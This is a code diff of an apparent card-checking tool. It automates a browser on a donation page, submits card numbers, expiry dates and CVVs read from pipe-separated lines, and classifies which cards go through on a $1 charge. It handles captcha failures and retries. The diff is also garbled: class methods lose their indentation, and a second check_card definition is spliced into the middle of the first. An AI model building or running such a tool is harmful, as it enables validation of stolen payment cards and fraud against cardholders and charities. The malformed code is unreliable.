@@ -342,33 +342,33 @@ class ChargeTester:
         return err[:80]
 
     def _read_response(self):
-        t0 = time.time()
-        max_wait = 150
-        while time.time() - t0 < max_wait:
-            alert_text = self._get_alert_text()
-            if alert_text:
-                m = re.search(r'Payment Error[:\s]*([^\n]{1,200})', alert_text, re.IGNORECASE)
+    t0 = time.time()
+    max_wait = 25
+    while time.time() - t0 < max_wait:
+        alert_text = self._get_alert_text()
+        if alert_text:
+            m = re.search(r'Payment Error[:\s]*([^\n]{1,200})', alert_text, re.IGNORECASE)
+            if m:
+                err = m.group(1).strip()
+                return (self._classify(err), False, err, round(time.time()-t0, 2))
+            fe = alert_text.lower().count("is required") + alert_text.lower().count("cannot be empty")
+            if fe >= 2:
+                return (None, True, "field errors", round(time.time()-t0, 2))
+        try:
+            html = self.driver.page_source
+            html_low = html.lower()
+            if 'thank you for your donation' in html_low:
+                return ("Charge 1$", False, "Success", round(time.time()-t0, 2))
+            if 'payment error' in html_low:
+                m = re.search(r'Payment Error[:\s]*([^\n<]{1,200})', html[:30000], re.IGNORECASE)
                 if m:
                     err = m.group(1).strip()
                     return (self._classify(err), False, err, round(time.time()-t0, 2))
-                fe = alert_text.lower().count("is required") + alert_text.lower().count("cannot be empty")
-                if fe >= 2:
-                    return (None, True, "field errors", round(time.time()-t0, 2))
-            try:
-                html = self.driver.page_source
-                html_low = html.lower()
-                if 'thank you for your donation' in html_low:
-                    return ("Charge 1$", False, "Success", round(time.time()-t0, 2))
-                if 'payment error' in html_low:
-                    m = re.search(r'Payment Error[:\s]*([^\n<]{1,200})', html[:30000], re.IGNORECASE)
-                    if m:
-                        err = m.group(1).strip()
-                        return (self._classify(err), False, err, round(time.time()-t0, 2))
-            except:
-                pass
-            time.sleep(0.5)
-        return ("TIMEOUT", False, "no response", round(time.time()-t0, 2))
-
+        except:
+            pass
+        time.sleep(0.5)
+    return ("TIMEOUT", False, "no response", round(time.time()-t0, 2))
+        
     def check_card(self, card_line):
         total_t0 = time.time()
         if self.driver is None:
@@ -408,15 +408,43 @@ class ChargeTester:
                 continue
             result, retry, message, resp_time = self._read_response()
             if retry:
+def check_card(self, card_line):
+    total_t0 = time.time()
+    if self.driver is None:
+        if not self._start_browser():
+            return ("BD_CONNECT_FAILED", "", 0)
+    if not self._open_donate_page():
+        self._close()
+        if not self._start_browser() or not self._open_donate_page():
+            return ("PAGE_LOAD_FAILED", "", round(time.time()-total_t0, 2))
+    parts = card_line.strip().split("|")
+    if len(parts) < 4:
+        return ("INVALID_FORMAT", "", 0)
+    number = parts[0]
+    mm = parts[1].strip().zfill(2)
+    yyyy = parts[2].strip()
+    cvv = parts[3].strip()
+    if len(yyyy) == 2:
+        yyyy = "20" + yyyy
+    for attempt in range(1, MAX_RETRIES_CH + 1):
+        if attempt > 1:
+            self._close()
+            time.sleep(1)
+            if not self._start_browser():
                 continue
-            elapsed = round(time.time() - total_t0, 2)
-            return (result, message, elapsed)
-        if captcha_fail_count >= MAX_RETRIES_CH:
-            return ("Captcha Error", "captcha not solved", round(time.time()-total_t0, 2))
-        if time.time() - total_t0 >= 150:
-            return ("TIMEOUT", "no response", round(time.time()-total_t0, 2))
-        return ("TIMEOUT", "no response", round(time.time()-total_t0, 2))
-
+            if not self._open_donate_page():
+                continue
+        self._fill_donor_info()
+        self._fill_payment_info(number, mm, yyyy, cvv)
+        ok = self._wait_token_and_send()
+        if not ok:
+            continue
+        result, retry, message, resp_time = self._read_response()
+        if retry:
+            continue
+        elapsed = round(time.time() - total_t0, 2)
+        return (result, message, elapsed)
+    return ("ALL_ATTEMPTS_FAILED", "", round(time.time()-total_t0, 2))
     def _close(self):
         try:
             if self.driver:
